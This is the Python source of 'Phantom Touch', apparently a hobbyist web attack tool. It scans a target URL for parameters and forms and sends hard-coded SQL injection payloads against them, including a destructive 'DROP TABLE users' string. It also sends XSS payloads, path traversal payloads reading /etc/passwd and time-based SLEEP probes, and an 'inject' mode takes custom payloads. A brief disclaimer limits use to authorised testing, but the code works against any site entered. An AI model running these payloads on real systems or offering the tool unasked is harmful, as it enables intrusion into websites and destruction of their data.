import os
import sys
import re
import requests
import socket
import time
from urllib.parse import urlparse, parse_qs, quote
from colorama import Fore, Style, init
from functools import lru_cache
import getpass

# Initialize colorama for cross-platform compatibility
init(autoreset=True)

def clear_screen():
    """Clear screen for mobile and desktop compatibility"""
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(message, duration=2):
    """Display a loading animation"""
    frames = ['|', '/', '-', '\\']
    print(Fore.LIGHTCYAN_EX + message, end=" ")
    for _ in range(duration * 4):
        print(Fore.LIGHTYELLOW_EX + frames[_ % 4], end="\r")
        time.sleep(0.25)
    print("\r" + " " * 50 + "\r", end="")  # Clear animation line

def show_disclaimer():
    """Display disclaimer banner for 7 seconds"""
    clear_screen()
    print(Fore.RED + r"""
    ╔════════════════════════════════════════════════════╗
    ║                   DISCLAIMER                       ║
    ║ This tool is for ethical penetration testing only.  ║
    ║ Use only on systems you have permission to test.   ║
    ║ Unauthorized use may violate laws. T.R.C.H is not   ║
    ║ responsible for misuse. Proceed with caution.       ║
    ╚════════════════════════════════════════════════════╝
    """)
    time.sleep(7)
    clear_screen()

def authenticate():
    """Password authentication with 3-attempt limit"""
    max_attempts = 3
    correct_password = "P@55word"
    
    for attempt in range(max_attempts):
        clear_screen()
        print(Fore.LIGHTCYAN_EX + "[*] Phantom Touch Authentication")
        password = getpass.getpass(Fore.LIGHTBLUE_EX + "[?] Enter password: ")
        
        if password == correct_password:
            clear_screen()
            print(Fore.GREEN + "[+] Authentication Verified. Happy Hacking!")
            loading_animation("Initializing Phantom Touch", 2)
            return True
        else:
            print(Fore.RED + f"[!] Incorrect password. {max_attempts - attempt - 1} attempts remaining.")
            time.sleep(1)
    
    clear_screen()
    print(Fore.RED + "[!] Too many failed attempts.")
    print(Fore.YELLOW + "[!] We see you're having some problem with the password.")
    print(Fore.YELLOW + "[!] Redirecting to our Facebook page to request the tool password...")
    print(Fore.LIGHTBLUE_EX + "https://www.facebook.com/profile.php?id=61555424416864")
    time.sleep(3)
    sys.exit(1)

class MobileInjector:
    def __init__(self):
        self.target = ""
        self.session = requests.Session()
        self.results = []
        self.vulnerabilities = []
        self.low_data_mode = False
        self.target_history = []
        self.configure_session()

    def configure_session(self):
        """Configure session for mobile compatibility"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Mobile) PhantomTouch/4.1',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        })
        self.session.timeout = 8
        retries = requests.adapters.Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        self.session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retries))
        self.session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retries))

    def toggle_low_data_mode(self, enabled):
        """Toggle low data mode"""
        self.low_data_mode = enabled
        self.session.headers.update({
            'Accept-Encoding': 'gzip, deflate' if enabled else 'gzip',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Mobile; LowData) PhantomTouch/4.1' if enabled else 'Mozilla/5.0 (Linux; Android 12; Mobile) PhantomTouch/4.1'
        })

    def validate_url(self, url):
        """Validate URL format and reachability"""
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                return False
            socket.getaddrinfo(parsed.netloc, parsed.port or (443 if parsed.scheme == 'https' else 80))
            return True
        except (ValueError, socket.gaierror):
            return False

    @lru_cache(maxsize=10)
    def discover_injection_points(self, target):
        """Find injection points with caching"""
        self.target = target
        injection_points = []
        loading_animation("Scanning for injection points")
        
        try:
            if not self.validate_url(target):
                raise ValueError("Invalid or unreachable URL")
            
            parsed = urlparse(target)
            if parsed.query:
                for param in parse_qs(parsed.query):
                    injection_points.append({
                        'type': 'url_param',
                        'name': param,
                        'sample_value': parse_qs(parsed.query)[param][0]
                    })
            
            response = self.session.get(target, stream=True)
            content = response.text[:3000] if self.low_data_mode else response.text[:5000]
            forms = re.finditer(
                r'<form[^>]*action=["\']?(.*?)["\'\s>].*?(method=["\']?(get|post)["\']?)?',
                content, 
                re.IGNORECASE
            )
            for form in forms:
                injection_points.append({
                    'type': 'form',
                    'action': form.group(1) or target,
                    'method': form.group(3) or 'POST'
                })
            
            if re.search(r'<input[^>]*name=["\']?(csrf|_csrf|token)["\']?', content, re.IGNORECASE):
                injection_points.append({
                    'type': 'csrf_check',
                    'action': target,
                    'method': 'POST'
                })

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[!] Network error during discovery: {str(e)}")
        except Exception as e:
            print(Fore.RED + f"[!] Discovery error: {str(e)}")
        
        return injection_points

    def test_injection(self, point, payload, test_type="generic"):
        """Execute injection with progress feedback"""
        result = {
            'type': point['type'],
            'payload': payload,
            'location': f"{point['type']}: {point.get('name', point.get('action', ''))}",
            'vulnerable': False,
            'test_type': test_type
        }
        loading_animation(f"Testing {test_type} on {point['type']}")
        
        try:
            if point['type'] == 'url_param':
                parsed = urlparse(self.target)
                query = parse_qs(parsed.query)
                query[point['name']] = [payload]
                new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
                injected_url = parsed._replace(query=new_query).geturl()
                
                response = self.session.get(
                    injected_url,
                    allow_redirects=False,
                    stream=True
                )
                content = response.text[:5000] if self.low_data_mode else response.text
                result.update({
                    'status': response.status_code,
                    'length': len(content),
                    'vulnerable': self.check_response(content, payload, test_type)
                })
            
            elif point['type'] == 'form':
                form_data = {point.get('name', 'input_field'): payload}
                response = self.session.request(
                    point['method'].upper(),
                    point['action'],
                    data=form_data if point['method'].lower() == 'post' else None,
                    params=form_data if point['method'].lower() == 'get' else None,
                    allow_redirects=False,
                    stream=True
                )
                content = response.text[:5000] if self.low_data_mode else response.text
                result.update({
                    'status': response.status_code,
                    'length': len(content),
                    'vulnerable': self.check_response(content, payload, test_type)
                })
            
            elif point['type'] == 'csrf_check':
                response = self.session.get(
                    point['action'],
                    allow_redirects=False,
                    stream=True
                )
                content = response.text[:5000] if self.low_data_mode else response.text
                result.update({
                    'status': response.status_code,
                    'length': len(content),
                    'vulnerable': not bool(re.search(r'<input[^>]*name=["\']?(csrf|_csrf|token)["\']?', content, re.IGNORECASE))
                })

        except requests.exceptions.RequestException as e:
            result['error'] = f"Network error: {str(e)}. Try enabling low data mode."
        except Exception as e:
            result['error'] = f"Unexpected error: {str(e)}"
        
        self.results.append(result)
        if result['vulnerable']:
            self.vulnerabilities.append(result)
        return result

    def test_response_time(self, point):
        """Test for blind vulnerabilities via response time"""
        result = {
            'type': point['type'],
            'payload': 'SLEEP(5)' if point['type'] == 'url_param' else None,
            'location': f"{point['type']}: {point.get('name', point.get('action', ''))}",
            'vulnerable': False,
            'test_type': 'response_time'
        }
        loading_animation("Testing response time")
        
        try:
            start_time = time.time()
            if point['type'] == 'url_param':
                parsed = urlparse(self.target)
                query = parse_qs(parsed.query)
                query[point['name']] = ['1; SLEEP(5)']
                new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
                injected_url = parsed._replace(query=new_query).geturl()
                response = self.session.get(injected_url, allow_redirects=False)
            else:
                form_data = {point.get('name', 'input_field'): 'SLEEP(5)'}
                response = self.session.request(
                    point['method'].upper(),
                    point['action'],
                    data=form_data if point['method'].lower() == 'post' else None,
                    params=form_data if point['method'].lower() == 'get' else None,
                    allow_redirects=False
                )
            elapsed = time.time() - start_time
            result.update({
                'status': response.status_code,
                'response_time': elapsed,
                'vulnerable': elapsed > 4
            })
            self.results.append(result)
            if result['vulnerable']:
                self.vulnerabilities.append(result)
            return result
        
        except requests.exceptions.RequestException as e:
            result['error'] = f"Network error: {str(e)}"
            self.results.append(result)
            return result

    def check_response(self, content, payload, test_type):
        """Enhanced vulnerability detection"""
        content = content.lower()
        if test_type == 'sqli':
            sql_errors = ['sql', 'syntax', 'mysql', 'ora-', 'sqlite', 'database error']
            return any(error in content for error in sql_errors)
        elif test_type == 'xss':
            xss_indicators = ['<script>', payload.lower(), 'onerror=', 'javascript:']
            return any(indicator in content for indicator in xss_indicators)
        elif test_type == 'path_traversal':
            traversal_indicators = ['etc/passwd', 'windows/win.ini', 'root:', '[extensions]']
            return any(indicator in content for indicator in traversal_indicators)
        return False

class MobileInterface:
    def __init__(self):
        self.payloads_sqli = ["' OR 1=1 --", "1; DROP TABLE users --", "' UNION SELECT NULL --"]
        self.payloads_xss = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)']
        self.payloads_path = ['../../etc/passwd', '../config.php', '../../windows/win.ini']
        show_disclaimer()
        if not authenticate():
            sys.exit(1)
        self.injector = MobileInjector()
        self.clear_screen()
        self.show_banner()

    def clear_screen(self):
        """Clear screen for clean display"""
        clear_screen()

    def show_banner(self):
        """Phantom Touch banner with slogan"""
        self.clear_screen()
        print(Fore.RED + r"""
    ‎ ███████████  █████                            █████                               
‎░░███░░░░░███░░███                            ░░███                                
‎ ░███    ░███ ░███████    ██████   ████████   ███████    ██████  █████████████     
‎ ░██████████  ░███░░███  ░░░░░███ ░░███░░███ ░░░███░    ███░░███░░███░░███░░███    
‎ ░███░░░░░░   ░███ ░███   ███████  ░███ ░███   ░███    ░███ ░███ ░███ ░███ ░███    
‎ ░███         ░███ ░███  ███░░███  ░███ ░███   ░███ ███░███ ░███ ░███ ░███ ░███    
‎ █████        ████ █████░░████████ ████ █████  ░░█████ ░░██████  █████░███ █████   
‎░░░░░        ░░░░ ░░░░░  ░░░░░░░░ ░░░░ ░░░░░    ░░░░░   ░░░░░░  ░░░░░ ░░░ ░░░░░    
‎                                                                                   
‎                                                                                   
‎                                                                                   
‎ ███████████                              █████                                    
‎░█░░░███░░░█                             ░░███                                     
‎░   ░███  ░   ██████  █████ ████  ██████  ░███████                                 
‎    ░███     ███░░███░░███ ░███  ███░░███ ░███░░███                                
‎    ░███    ░███ ░███ ░███ ░███ ░███ ░░░  ░███ ░███                                
‎    ░███    ░███ ░███ ░███ ░███ ░███  ███ ░███ ░███                                
‎    █████   ░░██████  ░░████████░░██████  ████ █████                               
‎   ░░░░░     ░░░░░░    ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                                
‎                                                                                   
‎                                                                                   
‎                                                                           """)
        print(Fore.LIGHTCYAN_EX + "  Phantom Touch v4.1 - by T.R.C.H")
        print(Fore.LIGHTGREEN_EX + "  Unleash the Shadows, Secure the Future")
        print(Fore.LIGHTBLACK_EX + "  Mobile-Optimized Penetration Testing\n")

    def show_menu(self):
        """Touch-friendly menu"""
        menu = [
            ("1", "Set Target URL"),
            ("2", "Show Recent Targets"),
            ("3", "Scan Injection Points"),
            ("4", "Test SQL Injection"),
            ("5", "Test XSS Vulnerability"),
            ("6", "Test Path Traversal"),
            ("7", "Check CSRF Protection"),
            ("8", "Response Time Analysis"),
            ("9", "Toggle Low Data Mode"),
            ("10", "View Results"),
            ("0", "Exit")
        ]
        print(Fore.LIGHTWHITE_EX + "┌" + "─"*34 + "┐")
        for num, text in menu:
            print(Fore.LIGHTWHITE_EX + "│ " + 
                  f"{Fore.LIGHTRED_EX}{num.ljust(2)}{Fore.LIGHTWHITE_EX} {Fore.LIGHTGREEN_EX}{text.ljust(30)}" + 
                  Fore.LIGHTWHITE_EX + "│")
        print(Fore.LIGHTWHITE_EX + "└" + "─"*34 + "┘")

    def touch_input(self, prompt):
        """Mobile-friendly input with haptic feedback simulation"""
        print(Fore.LIGHTBLUE_EX + f"[?] {prompt}: ", end="")
        try:
            user_input = input().strip()
            if not user_input:
                print(Fore.YELLOW + "[!] Input cannot be empty")
                return None
            print(Fore.LIGHTBLACK_EX + "[*] Input received")
            return user_input
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Operation cancelled")
            sys.exit(1)

    def set_target(self):
        """Set and validate target URL"""
        self.clear_screen()
        self.show_banner()
        url = self.touch_input("Enter target URL (e.g., http://example.com)")
        if url and self.injector.validate_url(url):
            self.injector.target = url
            if url not in self.injector.target_history:
                self.injector.target_history.append(url)
                if len(self.injector.target_history) > 5:
                    self.injector.target_history.pop(0)
            print(Fore.GREEN + f"[+] Target set: {url}")
        else:
            print(Fore.RED + "[!] Invalid or unreachable URL")

    def show_recent_targets(self):
        """Show recent target URLs"""
        self.clear_screen()
        self.show_banner()
        if not self.injector.target_history:
            print(Fore.YELLOW + "[!] No recent targets")
            return
        print(Fore.LIGHTCYAN_EX + "[*] Recent Targets:")
        for i, url in enumerate(self.injector.target_history, 1):
            print(Fore.LIGHTGREEN_EX + f"  {i}. {url}")
        choice = self.touch_input("Select a target number (or Enter to cancel)")
        if choice and choice.isdigit() and 1 <= int(choice) <= len(self.injector.target_history):
            self.injector.target = self.injector.target_history[int(choice) - 1]
            print(Fore.GREEN + f"[+] Selected target: {self.injector.target}")

    def scan_points(self):
        """Scan for injection points and check vulnerabilities"""
        if not self.injector.target:
            print(Fore.RED + "[!] No target set")
            return
        self.clear_screen()
        self.show_banner()
        points = self.injector.discover_injection_points(self.injector.target)
        if not points:
            print(Fore.YELLOW + "[!] No injection points found")
            return
        print(Fore.GREEN + f"[+] Found {len(points)} injection points:")
        for i, point in enumerate(points, 1):
            print(Fore.LIGHTCYAN_EX + f"  {i}. Type: {point['type']}, Location: {point.get('name', point.get('action', ''))}")

        # Test all vulnerabilities
        self.injector.vulnerabilities = []
        for point in points:
            if point['type'] != 'csrf_check':
                for payload in self.payloads_sqli:
                    self.injector.test_injection(point, payload, test_type="sqli")
                for payload in self.payloads_xss:
                    self.injector.test_injection(point, payload, test_type="xss")
                for payload in self.payloads_path:
                    self.injector.test_injection(point, payload, test_type="path_traversal")
                self.injector.test_response_time(point)
            else:
                self.injector.test_injection(point, None, test_type="csrf")

        # Display vulnerabilities
        if not self.injector.vulnerabilities:
            print(Fore.GREEN + "[+] No vulnerabilities found")
            return
        print(Fore.RED + f"[!] Found {len(self.injector.vulnerabilities)} vulnerabilities:")
        for i, vuln in enumerate(self.injector.vulnerabilities, 1):
            print(Fore.LIGHTRED_EX + f"  {i}. Type: {vuln['test_type'].upper()}, Location: {vuln['location']}")
            if vuln['payload']:
                print(Fore.LIGHTWHITE_EX + f"     Payload: {vuln['payload']}")
        
        # Prompt for injection
        choice = self.touch_input("Enter vulnerability number to inject, or 'm' to return to menu")
        if choice.lower() == 'm':
            return
        if choice.isdigit() and 1 <= int(choice) <= len(self.injector.vulnerabilities):
            vuln = self.injector.vulnerabilities[int(choice) - 1]
            self.perform_injection(vuln)

    def perform_injection(self, vuln):
        """Perform injection for a specific vulnerability"""
        self.clear_screen()
        self.show_banner()
        print(Fore.LIGHTCYAN_EX + f"[*] Injecting vulnerability: {vuln['test_type'].upper()} at {vuln['location']}")
        
        if vuln['test_type'] == 'xss':
            use_custom_url = self.touch_input("Use a custom URL for XSS injection? (y/n)")
            if use_custom_url.lower() == 'y':
                custom_url = self.touch_input("Enter custom URL")
                if custom_url and self.injector.validate_url(custom_url):
                    vuln['location'] = f"url_param: {custom_url}"
                    vuln['type'] = 'url_param'
                    parsed = urlparse(custom_url)
                    query = parse_qs(parsed.query)
                    if query:
                        vuln['name'] = list(query.keys())[0]
                    else:
                        print(Fore.RED + "[!] No parameters found in custom URL")
                        return
        
        payload = vuln.get('payload')
        if not payload and vuln['test_type'] != 'csrf' and vuln['test_type'] != 'response_time':
            payload = self.touch_input(f"Enter payload for {vuln['test_type'].upper()} injection")
        
        if vuln['test_type'] == 'response_time':
            result = self.injector.test_response_time({
                'type': vuln['type'],
                'name': vuln.get('name'),
                'action': vuln.get('action', self.injector.target),
                'method': vuln.get('method', 'POST')
            })
        else:
            result = self.injector.test_injection(
                {
                    'type': vuln['type'],
                    'name': vuln.get('name'),
                    'action': vuln.get('action', self.injector.target),
                    'method': vuln.get('method', 'POST')
                },
                payload,
                test_type=vuln['test_type']
            )
        
        if result.get('vulnerable'):
            print(Fore.RED + f"[!] Injection successful: {result['location']} ({result['test_type'].upper()})")
        else:
            print(Fore.GREEN + f"[+] Injection failed: {result['location']} ({result['test_type'].upper()})")
        if result.get('error'):
            print(Fore.RED + f"[!] Error: {result['error']}")

    def test_sqli(self):
        """Test SQL injection"""
        if not self.injector.target:
            print(Fore.RED + "[!] No target set")
            return
        self.clear_screen()
        self.show_banner()
        points = self.injector.discover_injection_points(self.injector.target)
        if not points:
            print(Fore.YELLOW + "[!] No injection points found")
            return
        for point in points:
            if point['type'] != 'csrf_check':
                for payload in self.payloads_sqli:
                    result = self.injector.test_injection(point, payload, test_type="sqli")
                    if result.get('vulnerable'):
                        print(Fore.RED + f"[!] Vulnerable: {result['location']} (Payload: {payload})")
                    else:
                        print(Fore.GREEN + f"[+] Safe: {result['location']} (Payload: {payload})")
                    time.sleep(0.5)

    def test_xss(self):
        """Test XSS vulnerability"""
        if not self.injector.target:
            print(Fore.RED + "[!] No target set")
            return
        self.clear_screen()
        self.show_banner()
        points = self.injector.discover_injection_points(self.injector.target)
        if not points:
            print(Fore.YELLOW + "[!] No injection points found")
            return
        for point in points:
            if point['type'] != 'csrf_check':
                for payload in self.payloads_xss:
                    result = self.injector.test_injection(point, payload, test_type="xss")
                    if result.get('vulnerable'):
                        print(Fore.RED + f"[!] Vulnerable: {result['location']} (Payload: {payload})")
                    else:
                        print(Fore.GREEN + f"[+] Safe: {result['location']} (Payload: {payload})")
                    time.sleep(0.5)

    def test_path_traversal(self):
        """Test path traversal vulnerability"""
        if not self.injector.target:
            print(Fore.RED + "[!] No target set")
            return
        self.clear_screen()
        self.show_banner()
        points = self.injector.discover_injection_points(self.injector.target)
        if not points:
            print(Fore.YELLOW + "[!] No injection points found")
            return
        for point in points:
            if point['type'] != 'csrf_check':
                for payload in self.payloads_path:
                    result = self.injector.test_injection(point, payload, test_type="path_traversal")
                    if result.get('vulnerable'):
                        print(Fore.RED + f"[!] Vulnerable: {result['location']} (Payload: {payload})")
                    else:
                        print(Fore.GREEN + f"[+] Safe: {result['location']} (Payload: {payload})")
                    time.sleep(0.5)

    def test_csrf(self):
        """Check for CSRF protection"""
        if not self.injector.target:
            print(Fore.RED + "[!] No target set")
            return
        self.clear_screen()
        self.show_banner()
        points = self.injector.discover_injection_points(self.injector.target)
        csrf_points = [p for p in points if p['type'] == 'csrf_check']
        if not csrf_points:
            print(Fore.YELLOW + "[!] No forms found for CSRF checking")
            return
        for point in csrf_points:
            result = self.injector.test_injection(point, None, test_type="csrf")
            if result.get('vulnerable'):
                print(Fore.RED + f"[!] CSRF Vulnerable: {result['location']} (No CSRF token detected)")
            else:
                print(Fore.GREEN + f"[+] CSRF Protected: {result['location']} (CSRF token detected)")
            time.sleep(0.5)

    def test_response_time(self):
        """Test response time for blind vulnerabilities"""
        if not self.injector.target:
            print(Fore.RED + "[!] No target set")
            return
        self.clear_screen()
        self.show_banner()
        points = self.injector.discover_injection_points(self.injector.target)
        if not points:
            print(Fore.YELLOW + "[!] No injection points found")
            return
        for point in points:
            if point['type'] != 'csrf_check':
                result = self.injector.test_response_time(point)
                if result.get('vulnerable'):
                    print(Fore.RED + f"[!] Potential Blind Vulnerability: {result['location']} (Response time: {result['response_time']:.2f}s)")
                else:
                    print(Fore.GREEN + f"[+] Safe: {result['location']} (Response time: {result['response_time']:.2f}s)")
                time.sleep(0.5)

    def toggle_low_data(self):
        """Toggle low data mode"""
        self.clear_screen()
        self.show_banner()
        self.injector.toggle_low_data_mode(not self.injector.low_data_mode)
        state = "enabled" if self.injector.low_data_mode else "disabled"
        print(Fore.GREEN + f"[+] Low data mode {state}")

    def show_results(self):
        """Display test results"""
        self.clear_screen()
        self.show_banner()
        if not self.injector.results:
            print(Fore.YELLOW + "[!] No results available")
            return
        print(Fore.LIGHTCYAN_EX + "[*] Test Results:")
        for i, result in enumerate(self.injector.results, 1):
            status = Fore.RED + "Vulnerable" if result.get('vulnerable') else Fore.GREEN + "Safe"
            print(Fore.LIGHTWHITE_EX + f"  {i}. {result['location']} - {status} ({result['test_type']})")
            if result.get('payload'):
                print(Fore.LIGHTBLACK_EX + f"     Payload: {result['payload']}")
            print(Fore.LIGHTBLACK_EX + f"     Status: {result.get('status', 'N/A')}, Length: {result.get('length', 'N/A')}")
            if result.get('response_time'):
                print(Fore.LIGHTBLACK_EX + f"     Response Time: {result['response_time']:.2f}s")
            if result.get('error'):
                print(Fore.RED + f"     Error: {result['error']}")

    def run(self):
        """Main application loop"""
        while True:
            self.clear_screen()
            self.show_banner()
            self.show_menu()
            choice = self.touch_input("Select option")
            if not choice:
                continue

            if choice == "1":
                self.set_target()
            elif choice == "2":
                self.show_recent_targets()
            elif choice == "3":
                self.scan_points()
            elif choice == "4":
                self.test_sqli()
            elif choice == "5":
                self.test_xss()
            elif choice == "6":
                self.test_path_traversal()
            elif choice == "7":
                self.test_csrf()
            elif choice == "8":
                self.test_response_time()
            elif choice == "9":
                self.toggle_low_data()
            elif choice == "10":
                self.show_results()
            elif choice == "0":
                print(Fore.RED + "[+] Exiting...")
                sys.exit(0)
            else:
                print(Fore.RED + "[!] Invalid option")
            
            input(Fore.LIGHTBLACK_EX + "\n[Press Enter to continue...")

if __name__ == "__main__":
    try:
        app = MobileInterface()
        app.run()
    except KeyboardInterrupt:
        clear_screen()
        print(Fore.RED + "\n[!] Closed by user")
        sys.exit(1)